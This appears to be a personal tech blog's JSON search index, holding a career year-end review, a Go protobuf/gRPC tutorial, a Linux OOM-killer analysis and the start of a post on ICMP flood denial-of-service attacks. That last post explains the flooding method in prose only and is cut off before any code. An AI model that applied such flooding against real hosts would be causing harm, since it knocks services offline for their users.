{"pages":[{"title":"","text":"{\"dependencies\":{\"hexo-asset-image\":\"https://github.com/7ym0n/hexo-asset-image\"}}","link":"/package.json"},{"title":"categories","text":"","link":"/categories/index.html"},{"title":"about","text":"我叫 James Lee，现在在互联网行业工作，现专注于游戏服务器开发，感兴趣的领域包括游戏服务器架构、大规模分布式架构、性能优化等。几年前还在读研究生时比较喜欢专研计算机视觉、算法工程化的领域，因此之前在博客园开了一个博客，分享计算机视觉相关的文章，不过后来毕业后工作方向发生了改变，自己的兴趣点和关注点也发生了变化，因此博客园的博客已经没有维护了，很多读者的咨询已经无力再回答。因此有了现在这个博客，主要记录一些工作上遇到的技术难点和解决的思路，还有对生活的一些思考。 一路走来，发现自己的工作学习历程还是挺丰富的，其实一直都在折腾： 华南农业大学-本科-通信工程 中山大学-硕士-软件工程 英特尔中国研究院-ISG 腾讯-QQ音乐 网易游戏-梦幻西游 互联网工作很辛苦，但入行多年始终觉得这一行还是挺适合自己的。希望自己不忘初心，始终能对技术保持好奇心，做一个 简单可依赖 的人。","link":"/about/index.html"},{"title":"tags","text":"","link":"/tags/index.html"}],"posts":[{"title":"2020年终总结：重新上路","text":"以前都会在新年前1天的晚上总结一年，但是19年因为特殊原因中断了这个习惯，不过从今年起这个习惯得重新启动起来，毕竟自己的年度总结对自而言意义非凡。总结一年的收获和成长，展望计划新的一年，总结和计划，是个人成长的重要阶段。 工作2020年个人一个很大的改变就是换工作了，2019年自己硕士毕业，在工作一年后重新思考的自己发展和个人成长，在定居城市、技术团队和发展方向上也做了很大的改变： 从深圳撤离，回到自己读书生活了7年的广州，以广州作为自己未来的定居城市。这个决定也是思考了很久，如果从工作机会上看，深圳有着更多的发展机会：腾讯、阿里、百度、华为、字节跳动、shoppee等都是一些不错的互联网公司。反观广州，工作机会就少了很多：腾讯、网易游戏、YY、bigo、虎牙等这些都算是知名的互联网企业。从工作机会上深圳更优，但从生活气息上和生活舒适度上，广州完胜深圳。因为自己在广州已经读书生活了7年了，直到硕士毕业才离开广州去到深圳生活了一年，刚到深圳时觉得深圳是个年轻、干净、有发展潜力、适合年轻人奋斗的大城市，但待久了就会觉得，深圳这城市还真的是奋斗之都，除了工作，生活就只剩无几了。后面发现深圳房价越来越夸张，眼看已经控制不住了（宝安这个鬼地方都8万起了），这导致我越发的焦虑，让我不得不重新思考了自己的定居城市，反复考虑觉得，广州才是自己的归属地，所以狠下心回到了广州。回到广州半年了，感觉一切都是那么的熟悉，还是广州能给自己生活的感觉，因为广州房价不高的原因，自己买房扎根也是未来可期。 公司从Q音到网易游戏，工作领域从互联网研发到游戏研发，工作挑战也发生了改变，但相同的是，无论是Q音还是现在的梦幻西游，都是一款超级成熟的产品，都是15年以上的老产品了，正因为产品成熟，所以技术上有很多可以借鉴学习的成功经验，因为代码里都有各代技术人优化的痕迹。产品过于成熟带来的一个问题就是，代码历史背负比较大，很多的开发都需要以兼容老代码老架构为主，在新技术新架构的尝试颇为难推进。 因为换了团队，团队的技术风格转变十分明显，现在的团队在技术上的氛围，确实更为优秀。无论是周会技术分享、新成员的培养、新技术新工具的推进和落地、code review的执行力，都让自己感到这确实是个搞技术的团队，另外，现在的团队很像学生时代的实验室，聚集了闷骚的技术男，专心忙自己的工作，有事帮忙喊一句就会过来，直到今天，我对团队还是十分的满意了。 发展方向因为工作领域的改变而有所变化，但是感觉还是变化不大。有人总说，互联网后台跟游戏服务器是两个不同的技术栈，但因为自己刚好在这两个行业都呆过，自己深刻的意识到：技术栈基本一致。无论是互联网后台还是游戏服务器，技术栈都是高度重合：语言C/C++,GO,Python都在大量使用；无论是互联网后台还是游戏，微服务、docker、k8s都在广泛使用；开源组件上，大家都重度依赖Mysql,Mongodb,Redis,kafka等。如果说不同点话，互联网后台的最大挑战是高并发，优化点是分布式系统各个节点，而游戏服务器的难点在于单机性能，优化的方向是怎么压榨单机的极限性能。互联网后台服务是无状态服务，读多写少，而游戏服务器更多的是有状态的，逻辑写多读少为主，所以在数据库处理思路上并不一致。另外，游戏服务器开发也有自己独有的挑战领域：网络同步和AOI。而且游戏玩法逻辑比一般的互联网产品的业务逻辑都要复杂的多。 技术成长2020年技术上算是有些长进，上半年因为疫情的原因，在家呆了比较久，因此也有充足的时间学习技术，后面来到新团队后，也学习了比较多游戏服务器上的设计。总结来说，2020年在这些技术知识点上是有不少长进： Mysql Linux性能优化 协程 网络协议，网络编程 互联网后台架构，高性能服务 kafka go shell 游戏服务器架构 磁盘IO 写作从17年开始，自己都坚持写技术文章，尤其在研究生期间写了大量的总结文章，但是2019年却一篇文章都没有写，一个很好的习惯却中断了。2020年初才重新开始写技术文章，把自己日常技术学习思考总结为文章分享出去。2020年写作方面自己比较满意的两个事情就是： 年初疫情在家时写的一篇关于Mysql的文章，分享到腾讯内网，昨天被评为年度十大热门文章； 搭建了这个独立博客，至今发表了好几篇文章，至少自己的写作习惯又重新坚持下来了。 生活从深圳回到广州后，自己更懂得生活了，更懂得工作之外的自己，该如何体验生活，寻找生活的乐趣。 登山徒步。跟公司同事尝试了一次高强度的徒步登山活动，从早上8点上山到下午4点下山，微信步数3W，下山时整个脚已经麻木了，但是这确实是个自己从来没过的生活体验。不过由于徒步登山实在强度太大，后面就再也没参与过了。 剧本杀。最近两个月迷上了剧本杀，开启了新的生活体验，同时也结识了一群同样爱好的朋友。现在周末基本都会来一局，基本上一局就是6个小时了，2点到晚上8点，玩得不亦乐乎，剧本杀在逻辑推理和口头表达上会有不少挑战。 看房。回到广州后，自己有空就会去各大楼盘逛一逛，看看楼市行情，虽然至今还没上车，但是看房这半年自己房地产相关的知识增长不少，无论是法律方面还是金融方面，或者是房地产商的开发风格，都有所了解了，正因为有了购房需求，逼着自己去了解更多这方面相关的知识，这也算是人生阅历快速增长的推动力。 基金。2020年才开始接触基金，以前因为缺乏这方面的知识，所以一直没有买基金或股票。今年开始，自己对这理财开始觉悟，开始关注这方面的知识，所以也看了一些书，了解了一些理财方面的学问，开始把自己固定储蓄改为基金投资。一年过去了，收益也接近于10%，也算及格吧。不过前期还是踩了一些坑，比如没有做调研就买了一个网红基金，最近跌得可惨了。不过其他有做功课的基金成长都不错，所以买基金这事情，还得多做功课才可下手，另外买一些经受过时间考验的明星老基金总不会错。 新的一年，新的计划2020年前半年过得有点坎坷，但下半年过得也算顺风顺水。上半年属于人生的振荡期，下半年一切都稳定起来了都好起来了，生活也逐渐有了起色，生活气息味越来越浓了。2021年给自己定个计划，1年后看看自己的实现情况。 买房。2021年希望遇到合适的小区合适的房子，然后下手把人生中的这件大事完成了。 理财更上一步。希望2021年基金理财年收益能去到15%。 健康运动。每周坚持2次健身房，把身体练好，工作后小肚子越来越大了，身体机能也大不如前，希望2021年自己能把精力放一点在健康上，把身体体态打造好。 技术上想要涉猎的领域：游戏服务器架构、游戏同步、AOI、mongodb底层原理、gRpc的底层实现、go的学习、性能分析工具学习、协程实现。 技术级别提升。 技术文章坚持2周一篇。","link":"/2021/01/02/2020%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93%EF%BC%9A%E9%87%8D%E6%96%B0%E4%B8%8A%E8%B7%AF/"},{"title":"Go快速上手—protobuf和gRPC","text":"gRPC是互联网后台常用的RPC框架，而protobuf是一个常用的通信协议，而gRPC中，protobuf常用作其服务间的协议通信，因此很有必要一块掌握这两个技术点。 protobufprotobuf 即 Protocol Buffers，是一种轻便高效的结构化数据存储格式，与语言、平台无关，可扩展可序列化。protobuf 性能和效率大幅度优于 JSON、XML 等其他的结构化数据格式。protobuf 是以二进制方式存储，占用空间小，但也带来了可读性差的缺点（二进制协议，因为不可读而难以调试，不好定位问题）。 在序列化协议中，JSON，protobuf以及msgpack都是业界常用的协议，我经历的项目都有用到。我经历的团队里，QQ音乐，全民K歌用的是内部开发的JCE协议，只是protobuf换皮的自研协议而已。而梦幻西游微服务使用protobuf作为内部服务通信协议。正因为protobuf的轻量级以及效率极其优秀，因此在众多后台项目中广泛使用。在对外的接口，我们用http协议支持对方的服务调用，而对内的服务间rpc调用，我们倾向于使用protobuf这种轻量级、效率优先的协议。 安装macos安装probubuf步骤如下： brew install protobuf // protobuf项目库 go get -u github.com/golang/protobuf/protoc-gen-go // 安装protobuf转go的工具 检查是否安装完成 12junshideMacBook-Pro:~ junshili$ protoc --versionlibprotoc 3.13.0 协议定义protobuf协议定义，这里我们新建一个user.proto协议，里面新增了Student结构体。 123456789101112syntax = &quot;proto3&quot;; // 版本声明，使用Protocol Buffers v3版本option go_package =&quot;pb/proto_demo&quot;; //包名message Student { string name = 1; bool male = 2; repeated int32 scores = 3; map&lt;string, int32&gt; subject = 4;} 语法相关： protobuf 有2个版本，默认版本是 proto2，如果需要 proto3，则需要在非空非注释第一行使用 syntax = “proto3” 标明版本。 package，即包名声明符是可选的，用来防止不同的消息类型有命名冲突。如果需要指定不一样的包名，可以使用go_package选项 repeated 表示字段可重复，即用来表示 Go 语言中的数组类型。 每个字符 =后面的数字称为标识符，每个字段都需要提供一个唯一的标识符。 当在传递数据时，对于required数据类型，如果用户没有设置值，则使用默认值传递到对端 文件名使用小写下划线的命名风格，例如 lower_snake_case.proto 命名规范： 消息名使用首字母大写驼峰风格(CamelCase),例如message StudentRequest; 字段名使用小写下划线的风格，例如 string status_code = 1; 枚举类型，枚举名使用首字母大写驼峰风格，例如 enum FooBar，枚举值使用全大写下划线隔开的风格(CAPITALS_WITH_UNDERSCORES )，例如 FOO_DEFAULT=1 protobuf转go进入到proto/目录下，进行协议转go代码 1protoc --go_out=. *.proto 生成go的协议文件proto/pb/proto_demo/user.pb.go 文件组织结构 123456789web├── go.mod├── go.sum├── main.go├── proto│ ├── pb│ │ └── proto_demo│ │ └── user.pb.go│ └── user.proto proto转化的go代码,无需手动修改 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101// Code generated by protoc-gen-go. DO NOT EDIT.// versions:// protoc-gen-go v1.26.0// protoc v3.13.0// source: user.protopackage proto_demoimport ( protoreflect &quot;google.golang.org/protobuf/reflect/protoreflect&quot; protoimpl &quot;google.golang.org/protobuf/runtime/protoimpl&quot; reflect &quot;reflect&quot; sync &quot;sync&quot;)const ( // Verify that this generated code is sufficiently up-to-date. _ = protoimpl.EnforceVersion(20 - protoimpl.MinVersion) // Verify that runtime/protoimpl is sufficiently up-to-date. _ = protoimpl.EnforceVersion(protoimpl.MaxVersion - 20))type Student struct { state protoimpl.MessageState sizeCache protoimpl.SizeCache unknownFields protoimpl.UnknownFields Name string `protobuf:&quot;bytes,1,opt,name=name,proto3&quot; json:&quot;name,omitempty&quot;` Male bool `protobuf:&quot;varint,2,opt,name=male,proto3&quot; json:&quot;male,omitempty&quot;` Scores []int32 `protobuf:&quot;varint,3,rep,packed,name=scores,proto3&quot; json:&quot;scores,omitempty&quot;` Subject map[string]int32 `protobuf:&quot;bytes,4,rep,name=subject,proto3&quot; json:&quot;subject,omitempty&quot; protobuf_key:&quot;bytes,1,opt,name=key,proto3&quot; protobuf_val:&quot;varint,2,opt,name=value,proto3&quot;`}func (x *Student) Reset() { *x = Student{} if protoimpl.UnsafeEnabled { mi := &amp;file_user_proto_msgTypes[0] ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x)) ms.StoreMessageInfo(mi) }}func (x *Student) String() string { return protoimpl.X.MessageStringOf(x)}func (*Student) ProtoMessage() {}func (x *Student) ProtoReflect() protoreflect.Message { mi := &amp;file_user_proto_msgTypes[0] if protoimpl.UnsafeEnabled &amp;&amp; x != nil { ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x)) if ms.LoadMessageInfo() == nil { ms.StoreMessageInfo(mi) } return ms } return mi.MessageOf(x)}// Deprecated: Use Student.ProtoReflect.Descriptor instead.func (*Student) Descriptor() ([]byte, []int) { return file_user_proto_rawDescGZIP(), []int{0}}func (x *Student) GetName() string { if x != nil { return x.Name } return &quot;&quot;}func (x *Student) GetMale() bool { if x != nil { return x.Male } return false}func (x *Student) GetScores() []int32 { if x != nil { return x.Scores } return nil}func (x *Student) GetSubject() map[string]int32 { if x != nil { return x.Subject } return nil}...后续代码无需关注 protobuf序列化和反序列化的实践下面给出一个go使用protobuf对对象进行序列化以及反序列化的一个实战例子，用的prttobuf协议是我们上面刚定义好的Student.proto。 main.go的调用，验证序列化前后数据是否一致 12345678910111213141516171819202122232425262728293031323334353637383940package mainimport ( &quot;fmt&quot; &quot;github.com/golang/protobuf/proto&quot; &quot;web_demo/proto/pb/proto_demo&quot;)func main() { test := &amp;proto_demo.Student { Name: &quot;James&quot;, Male: true, Scores: []int32{98, 85, 88}, Subject: map[string]int32{&quot;age&quot;:18, &quot;level&quot;:1}, } // 序列化 data, err := proto.Marshal(test) if err != nil { fmt.Println(&quot;proto encode error: &quot;, err) return } // 反序列化 newTest := &amp;proto_demo.Student{} err = proto.Unmarshal(data, newTest) if err != nil { fmt.Println(&quot;proto decode error: &quot;, err) } if test.GetScores()[1] != newTest.GetScores()[1] { fmt.Printf(&quot;data mismatch score %d != %d&quot;, test.GetScores()[1], newTest.GetScores()[1]) return } if test.GetName() != newTest.GetName() { fmt.Printf(&quot;data mismatch name %s != %s&quot;, test.GetName(), newTest.GetName()) return } fmt.Println(&quot;data match!&quot;)} gRPCgRPC的特点 gRPC由google开发，是一款语言中立、平台中立、开源的远程过程调用系统,基于HTTP2协议标准设计开发 gRPC可以实现微服务，将大的项目拆分为多个小且独立的业务模块，也就是服务，各服务间使用高效的protobuf协议进行RPC调用，gRPC默认使用protocol buffers 支持多种开发语言 一次RPC的完整流程： 客户端（gRPC Sub）调用 A 方法，发起 RPC 调用 对请求信息使用 Protobuf 进行对象序列化压缩（IDL） 服务端（gRPC Server）接收到请求后，解码请求体，进行业务逻辑处理并返回 对响应结果使用 Protobuf 进行对象序列化压缩（IDL） 客户端接受到服务端响应，解码请求体。回调被调用的 A 方法，唤醒正在等待响应（阻塞）的客户端调用并返回响应结果 我们在protobuf协议定义上扩展一个类型定义：Service，这在RPC通讯上有着重要作用。 gRpc实战例子先定义一个hello服务协议，注意Hello结构体内声明了SayHello和SayHi两个接口，这两个接口需要在server侧实现，client侧会发起rpc直接调用。 123456789101112131415161718192021222324252627282930313233343536syntax = &quot;proto3&quot;; // 指定proto版本// 指定golang包名option go_package = &quot;pb/proto_demo&quot;;// 定义Hello服务service Hello { // 定义SayHello方法 rpc SayHello(HelloRequest) returns (HelloResponse) {} rpc SayHi(HiRequest) returns (HiResponse) {}}// HelloRequest 请求结构message HelloRequest { string name = 1;}// HelloResponse 响应结构message HelloResponse { string message = 1;}// HiRequest 请求结构message HiRequest { string name = 1; string school = 2; int32 age = 3; int32 grade = 4; int32 status = 5;}// HiResponse 响应结构message HiResponse { string message = 1; int32 status = 2;} 进入到proto文件夹，执行指令生成grpc版本的协议go代码 1protoc -I . --go_out=plugins=grpc:. ./hello.proto 生成了文件proto/pb/hello.pb.go，项目组织如下： 1234567891011121314web├── client│ └── main.go├── go.mod├── go.sum ├── proto│ ├── hello.proto│ ├── pb│ │ └── proto_demo│ │ ├── hello.pb.go│ │ └── user.pb.go│ └── user.proto└── server └── main.go 此时我们先编写服务器一侧的service：server/main.go，主要功能是定义好监听地址端口，定义service相关函数SayHello和SayHi。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package main// serverimport ( &quot;fmt&quot; &quot;net&quot; &quot;web_demo/proto/pb/proto_demo&quot; &quot;google.golang.org/grpc&quot; &quot;golang.org/x/net/context&quot; &quot;google.golang.org/grpc/grpclog&quot;)const ( // gRPC服务地址 Address = &quot;127.0.0.1:9988&quot;)type helloService struct {}var HelloService = helloService{}func (h helloService) SayHello(ctx context.Context, in *proto_demo.HelloRequest) (*proto_demo.HelloResponse, error) { resp := new(proto_demo.HelloResponse) resp.Message = fmt.Sprintf(&quot;Hello %s.&quot;, in.Name) return resp, nil}func (h helloService) SayHi(ctx context.Context, in *proto_demo.HiRequest) (*proto_demo.HiResponse, error) { resp := new(proto_demo.HiResponse) resp.Message = fmt.Sprintf(&quot;Hi %s, grade=%d, school=%s, grade=%d, status=%d&quot;, in.Name, in.Grade, in.School, in.Grade, in.Status) return resp, nil}func main() { listen, err := net.Listen(&quot;tcp&quot;, Address) if err != nil { grpclog.Fatalf(&quot;Failed to listen: %v&quot;, err) } s := grpc.NewServer() proto_demo.RegisterHelloServer(s, HelloService) fmt.Println(&quot;Listen on &quot; + Address) grpclog.Println(&quot;Listen on &quot; + Address) s.Serve(listen)} 启动server/main.go，开始监听端口9988 12junshideMacBook-Pro:server junshili$ go run main.go Listen on 127.0.0.1:9988 开始编写client的发起rpc调用部分，生成文件client/main.go 12345678910111213141516171819202122232425262728293031323334353637383940414243package main// clientimport ( &quot;web_demo/proto/pb/proto_demo&quot; &quot;google.golang.org/grpc&quot; &quot;golang.org/x/net/context&quot; &quot;google.golang.org/grpc/grpclog&quot; &quot;fmt&quot;)const ( // gRPC服务地址 Address = &quot;127.0.0.1:9988&quot;)func main() { conn, err := grpc.Dial(Address, grpc.WithInsecure()) if err != nil { grpclog.Fatalln(err) } defer conn.Close() c := proto_demo.NewHelloClient(conn) req := &amp;proto_demo.HelloRequest{Name:&quot;grpc&quot;} res, err := c.SayHello(context.Background(), req) if err != nil { grpclog.Fatalln(err) } fmt.Println(res.Message) req2 := &amp;proto_demo.HiRequest{Name:&quot;grpc&quot;, Grade:3, Age:10, Status:2, School:&quot;zhuhai&quot;} res2, err := c.SayHi(context.Background(), req2) if err != nil { grpclog.Fatalln(err) } fmt.Println(res2.Message)} 启动client/main.go，连接”127.0.0.1:9988”，请求rpc hello服务 123junshideMacBook-Pro:client junshili$ go run main.go Hello grpc.Hi grpc, grade=3, school=zhuhai, grade=3, status=2","link":"/2021/05/12/Go%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B%E2%80%94protobuf%E5%92%8CgRPC/"},{"title":"OOM Killer机制分析","text":"近日上班工作群有人说，隔壁游戏组突然一连挂了好几台服务器，很突然暂时没分析出宕机的原因。确实很诡异，因为服务器接连挂掉的情况并不常见。我们组一下子也紧张起来，因为我们两个组用的是同一个游戏服务器引擎，隔壁出事了，也预示着我们也有类似的风险。不过没多久，隔壁组宕机的原因定位到了，有位开发在执行扫档脚本时，因为脚本grep的筛选条件没写好，这个脚本进程吃掉了系统几十G内存，触发了Linux操作系统的OOM Killer机制，把游戏进程给杀死了。因为这位开发执行的是全服扫档（几百个服务器同时执行脚本），因此接连有服务器宕机。好在发现的早，不然某知名游戏全服宕机的新闻将刷爆游戏论坛。 情景还原：我需要去游戏服去扫档（也就是扫log）获得一些游戏数据，我写了一个脚本打算把符合条件的数据重定向到一个新文件，但是太大意，脚本没写好，条件没写好，写成了类似的：grep * log/*，然而我们log里的文件有几百G，这样会导致会把所有log读入内存，因此迅速吃掉系统的大量内存，然后游戏进程就挂了。 听起来还是觉得很不可思议：我去扫log居然把线上业务搞挂了，真是倒霉透了。其实有更倒霉的，我们组有组员曾经因为用vim打开一个超大的文件，也把内存大量吃掉，同样导致了游戏宕机。后来运维做了一些措施限制vim打开一些超大文件（文件太大就不让打开了），防止这类似情况的发生。显然隔壁组没在这块吃过亏，因此造成本次事故。 这是一个真实生产下Linux OOM Killer机制对线上业务造成恶劣影响的典型例子，因此这里想深入讨论一下OOM Killer机制。这个线上事故，即使听到了最终原因分析，但心中仍然有很多疑问：短时间内快速吃掉大量内存的是脚本进程，为什么系统不去杀死脚本进程，而是杀死占用内存一直稳定的游戏进程？ 什么是OOM KillerOOM全称 Out-of-Memory，也就是操作系统的可利用的内存已经不足了，没法再分配新的内存出来给进程，导致系统没法继续工作，如果不紧急处理，最终的结果必定是系统关机，系统上的所有进程将被杀死。因此OS为了保证内核系统层面的稳定运行，就会根据一定算法规则，选出最应该优先被杀死的进程（理论上就是最占内存空间的那个进程）进行杀死，杀死之后系统就腾出了大量的内存空间，系统的生命将得以延续，继续稳定运行，而这个机制就是OOM Killer机制。 读到这里其实会对Linux的这个设计产生比较多的疑问，最大的疑问就是：为什么要杀死无辜者进程，而不处理肇事者进程？ 仔细再分析应该就明白了，其实操作系统没办法去区分哪个是肇事者进程。考虑这种情况：A进程疯狂分配内存，导致系统可用的内存已用完，此时B进程需要分配内存空间，那B进程肯定分配空间失败啊，不断抛出异常，挂掉的还是无辜的B;如果是OS自己需要分配内存空间，发现alloc_page返回失败，那就严重多了，为了不影响后面的逻辑，OS会更倾向于与fast fail，选择shutdown。 翻了下linux OOM Killer的源码，看到作者留下的这句话，还是蛮有意思的。 12345* out_of_memory - kill the &quot;best&quot; process when we run out of memory* If we run out of memory, we have the choice between either* killing a random task (bad), letting the system crash (worse)* OR try to be smart about which process to kill. Note that we* don't have to be perfect here, we just have to be good. 大概翻译一下：“当我们内存不足时，我们有两种处理方案：随机杀死一个任务，这可能会导致系统崩溃；或者尝试有策略地选出值得杀死的那个任务。我们没有必要做到最好，但我们只需尽力把这事做好”。– 潜台词：这件事我们至今都没找到一个完美算法，误杀进程我们不背锅。 继续从源码分析oom killer。进程使用__alloc_pages()分配内存时，当分配失败时，如果系统有配置OOM Killer，就会进入这个out_of_memory的逻辑。这个out_of_memory做了这几件事：选择要杀死的进程、杀死进程、回收进程内存空间。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475bool out_of_memory(struct oom_control *oc){ unsigned long freed = 0; if (oom_killer_disabled) return false; if (!is_memcg_oom(oc)) { blocking_notifier_call_chain(&amp;oom_notify_list, 0, &amp;freed); if (freed &gt; 0) /* Got some memory back in the last second. */ return true; } /* * If current has a pending SIGKILL or is exiting, then automatically * select it. The goal is to allow it to allocate so that it may * quickly exit and free its memory. */ // task_will_free_mem函数其实是去检查一下当前有没有进程挂了，有的话就回收他的内存，回收内存后那就不需要oom killer杀进程了 if (task_will_free_mem(current)) { mark_oom_victim(current); wake_oom_reaper(current); return true; } /* * The OOM killer does not compensate for IO-less reclaim. * pagefault_out_of_memory lost its gfp context so we have to * make sure exclude 0 mask - all other users should have at least * ___GFP_DIRECT_RECLAIM to get here. But mem_cgroup_oom() has to * invoke the OOM killer even if it is a GFP_NOFS allocation. */ if (oc-&gt;gfp_mask &amp;&amp; !(oc-&gt;gfp_mask &amp; __GFP_FS) &amp;&amp; !is_memcg_oom(oc)) return true; /* * Check if there were limitations on the allocation (only relevant for * NUMA and memcg) that may require different handling. */ oc-&gt;constraint = constrained_alloc(oc); if (oc-&gt;constraint != CONSTRAINT_MEMORY_POLICY) oc-&gt;nodemask = NULL; check_panic_on_oom(oc); if (!is_memcg_oom(oc) &amp;&amp; sysctl_oom_kill_allocating_task &amp;&amp; current-&gt;mm &amp;&amp; !oom_unkillable_task(current) &amp;&amp; oom_cpuset_eligible(current, oc) &amp;&amp; current-&gt;signal-&gt;oom_score_adj != OOM_SCORE_ADJ_MIN) { get_task_struct(current); oc-&gt;chosen = current; oom_kill_process(oc, &quot;Out of memory (oom_kill_allocating_task)&quot;); return true; } select_bad_process(oc); //选择需要杀死的进程 /* Found nothing?!?! */ // 找不到可以杀死的进程，那操作系统死锁了，这个情况下系统必然挂了 if (!oc-&gt;chosen) { dump_header(oc, NULL); pr_warn(&quot;Out of memory and no killable processes...\\n&quot;); /* * If we got here due to an actual allocation at the * system level, we cannot survive this and will enter * an endless loop in the allocator. Bail out now. */ if (!is_sysrq_oom(oc) &amp;&amp; !is_memcg_oom(oc)) panic(&quot;System is deadlocked on memory\\n&quot;); } if (oc-&gt;chosen &amp;&amp; oc-&gt;chosen != (void *)-1UL) oom_kill_process(oc, !is_memcg_oom(oc) ? &quot;Out of memory&quot; : &quot;Memory cgroup out of memory&quot;); return !!oc-&gt;chosen;} oom killer在选择进程杀死前先去检查一下当前有没有进程挂了，有的话优先回收他的内存资源，毕竟杀死一个线上运行的进程毕竟是下下策。然后才是进入到进程选择阶段，oom_kill.c这样实现了选择策略： 12345678910111213141516171819202122232425262728293031323334353637383940long oom_badness(struct task_struct *p, unsigned long totalpages){ long points; long adj; if (oom_unkillable_task(p)) return LONG_MIN; p = find_lock_task_mm(p); if (!p) return LONG_MIN; /* * Do not even consider tasks which are explicitly marked oom * unkillable or have been already oom reaped or the are in * the middle of vfork */ adj = (long)p-&gt;signal-&gt;oom_score_adj; if (adj == OOM_SCORE_ADJ_MIN || test_bit(MMF_OOM_SKIP, &amp;p-&gt;mm-&gt;flags) || in_vfork(p)) { task_unlock(p); return LONG_MIN; } /* * The baseline for the badness score is the proportion of RAM that each * task's rss, pagetable and swap space use. */ points = get_mm_rss(p-&gt;mm) + get_mm_counter(p-&gt;mm, MM_SWAPENTS) + mm_pgtables_bytes(p-&gt;mm) / PAGE_SIZE; task_unlock(p); /* Normalize to oom_score_adj units */ adj *= totalpages / 1000; points += adj; return points;} Oom killer通过这个oom_badness函数进行打分，返回值是根据一定策略给进程打的分数，后续oom killer根据该分数高低选择出最该杀死的那个进程（分数越高越优先杀死），这里需要注意3个点： adj == OOM_SCORE_ADJ_MIN时，说明该进程已被设置为不可被杀死进程，返回的得分将无限低（LONG_MIN）。 points = get_mm_rss(p-&gt;mm) + get_mm_counter(p-&gt;mm, MM_SWAPENTS) + mm_pgtables_bytes(p-&gt;mm) / PAGE_SIZE;分数公式，分数是由这三部分计算打出：进程所占用的内存中的空间、SWAP所占用的空间、page cache里所占用的空间 ； adj *= totalpages / 1000; points += adj; 分数另一部分的构成是这个oom_score_adj，这个是配置在内核文件的，范围是-1000~1000，默认是0，所以oom_badness先把该分数归一化，再做加法。 所以，Linux提供了一个策略，可以让用户通过填写oom_score_adj文件来影响oom killer的选择，当你填-1000时，则表示该进程将不会被杀死，但如果你填写的是非-1000，那这个进程还是会参与打分，但会受到oom_score_adj的影响，比如oom_score_adj你填了-3，当你的进程消耗内存很大时，同样大概率会被杀死。还有一个值得注意的是，oom killer选择策略，只受进程占用内存和oom_score_adj的影响，至于该进程是否是短时间内快速吃掉大量内存，oom killer并不关心。这就很好解释了，为什么我们游戏进程（占用内存最多但稳定）会被优先杀死了。oom_score_adj的值可以在/proc//oom_score_adj上修改。 读到这里也大概明白oom killer的设计思路了，系统也希望有一个策略能完美地选出该杀的进程，但现实上却没有这么优秀的算法，跑在OS上的进程成千上万，我们怎么能这么有把握选出的进程必然是正确的，只是选出一个比较合适的而已，误杀在所难免。举个现实的例子，你在你的macbook上开着QQ音乐听歌，同时也开着matlab做实验，QQ音乐占用内存不多，matlab占用内存大，此时我们在matlab运行某个算法导致吃掉大量内存触发OOM Killer，那问题来了，此时你是OS，你会选择杀死matlab还是QQ音乐？从OS的角度，MATLAB是短时间内快速吃掉大量内存而且是当前内存占用最多的进程，理应杀他；用户角度，MATLAB还跑着实验啊，实验数据还没保存，你杀QQ音乐啊，那个进程对我没什么用。所以，一个优秀的策略还真不能覆盖全部场景。 生产环境上也如此，脚本进程和游戏进程，同样是占用大量内存的进程，在没额外的判断条件下，杀死任何之一都是符合要求，更何况此时游戏进程占用了更多的内存，即使是短时间内快速消耗内存的脚本进程，在OS看来，也许真没必要杀死，在OS的角度，杀死后快速腾出大量空间进程，才是那个最值得杀的进程。 怎么避免OOM Killer误杀我的业务进程？避免oom killer的方案 直接修改/proc//oom_score_adj文件，将其置为-1000 123以前是通过/proc/&lt;pid&gt;/oom_score来控制的，但近年来新版linux已经使用oom_score_adj来代替旧版的oom_score，参考：https://github.com/tinganho/linux-kernel/blob/master/Documentation/feature-removal-schedule.txt#L171 直接关闭oom-killer 12# echo &quot;0&quot; &gt; /proc/sys/vm/oom-kill 关闭# echo &quot;1″ &gt; /proc/sys/vm/oom-kill 激活","link":"/2020/11/21/OOM-Killer%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90/"},{"title":"ICMP洪水攻击","text":"ICMP协议实现了PING的程序，ICMP除了实现这么一个PING程序，还有哪些不为人知或者好玩的用途？这里我将介绍ICMP另一个很有名的黑科技：ICMP洪水攻击。 ICMP洪水攻击属于大名鼎鼎的DOS（Denial of Service）攻击的一种，一种是黑客们喜欢的攻击手段，这里本着加深自己对ICMP的理解的目的，也试着基于ICMP写一段ICMP的洪水攻击小程序。 洪水攻击（FLOOD ATTACK）指的是利用计算机网络技术向目的主机发送大量无用数据报文，使得目的主机忙于处理无用的数据报文而无法提供正常服务的网络行为。ICMP洪水攻击：顾名思义，就是对目的主机发送洪水般的ping包，使得目的主机忙于处理ping包而无能力处理其他正常请求，这就好像是洪水一般的ping包把目的主机给淹没了。 要实现ICMP的洪水攻击，需要以下三项的知识储备： DOS攻击原理 ICMP的深入理解 原始套接字的编程技巧 一、ICMP洪水攻击原理ICMP洪水攻击是在ping的基础上形成的，但是ping程序很少能造成目的及宕机的问题，这是因为ping的发送包的速率太慢了，像我实现的PING程序里ping包发送速率限定在1秒1发，这个速率目的主机处理ping包还是绰绰有余的。所以要造成“洪水”的现象，就必须提升发包速率。这里介绍三种ICMP洪水攻击的方式： （1）直接洪水攻击这样做需要本地主机的带宽和目的主机的带宽之间进行比拼，比如我的主机网络带宽是30M的，而你的主机网络带宽仅为3M，那我发起洪水攻击淹没你的主机成功率就很大了。这种攻击方式要求攻击主机处理能力和带宽要大于被攻击主机，否则自身被DoS了。基于这种思想，我们可以使用一台高带宽高性能的电脑，采用多线程的方法一次性发送多个ICMP请求报文，让目的主机忙于处理大量这些报文而造成速度缓慢甚至宕机。这个方法有个大缺点，就是对方可以根据ICMP包的IP地址而屏蔽掉攻击源，使得攻击不能继续。 